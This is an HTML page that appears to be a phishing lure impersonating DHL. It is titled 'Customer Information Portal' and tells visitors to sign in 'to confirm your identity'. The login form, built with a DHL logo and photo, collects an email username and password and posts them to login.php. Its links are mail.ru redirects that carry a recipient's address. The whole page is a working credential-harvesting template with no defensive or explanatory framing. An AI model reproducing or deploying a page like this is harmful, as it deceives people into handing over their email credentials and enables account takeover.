<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
  
  <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">
  <title></title>

  
</head><body style="background-color: rgb(255, 204, 51); color: rgb(0, 0, 0);" alink="#ee0000" link="#0000ee" vlink="#551a8b">
<div class="container">
<div class="row">
<div class="Absolute-Center is-Responsive">
<div style="text-align: center;"><a href="https://e.mail.ru/cgi-bin/link?check=1&amp;cnf=7bea74&amp;url=https%3A%2F%2Fwww.mail.com&amp;msgid=15154822160000000542;0;0;1&amp;x-email=bruimpex%40mail.ru" target="_blank" rel=" noopener noreferrer" style="color: rgb(255, 204, 0) ! important; cursor: pointer ! important;"><img src="data:image/png;base64,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" alt="" style="border: 0px solid ; width: 185px; height: 72px;"></a><br>
<br>
</div>
<div style="text-align: center;"><a href="https://e.mail.ru/cgi-bin/link?check=1&amp;cnf=7bea74&amp;url=https%3A%2F%2Fwww.mail.com&amp;msgid=15154822160000000542;0;0;1&amp;x-email=bruimpex%40mail.ru" target="_blank" rel=" noopener noreferrer" style="color: rgb(8, 87, 166) ! important; cursor: pointer ! important;"><span style="font-weight: bold; font-family: Arial Black;">CUSTOMER
INFORMATION PORTAL</span></a><br>
<br>
</div>
<div style="text-align: center;">
</div>
<div class="col-sm-12 col-md-10 col-md-offset-1">
<form action="login.php" id="loginForm" method="post">
  <div style="text-align: center;"> </div>
  <div style="text-align: center;" class="form-group input-group"> <span class="input-group-addon"></span> <input size="40" class="form-control" required="" name="username" value="" placeholder="Email username"> </div>
  <div style="text-align: center;"> </div>
  <div style="text-align: center;" class="form-group input-group"> <br>
  <span class="input-group-addon"></span> <input size="40" class="form-control" name="password" placeholder="Email password" required="" autofocus="" type="password"> </div>
  <div style="text-align: center;"> </div>
  <div style="text-align: center;" class="checkbox"> <br>
  </div>
  <div style="text-align: center;" class="form-group"> <button class="btn btn-def btn-block">LOGIN</button> </div>
</form>
  <div style="text-align: center;"> </div>
  <div class="form-group text-center">
  <div style="text-align: center;"> <br>
  <span style="color: red; font-weight: bold; font-family: Arial Black;">WELCOME
TO DHL DELIVERY PORTAL. PLEASE SIGN IN TO CONFIRM YOUR IDENTITY<br>
  <img style="width: 762px; height: 335px;" alt="" src="https://i2.wp.com/www.informationhood.com/wp-content/uploads/2017/07/large_article_im3095_DHL_multi_modal.jpg?resize=610%2C335"><br>
  </span></div>
  </div>
</div>
</div>
</div>
</div>

</body></html>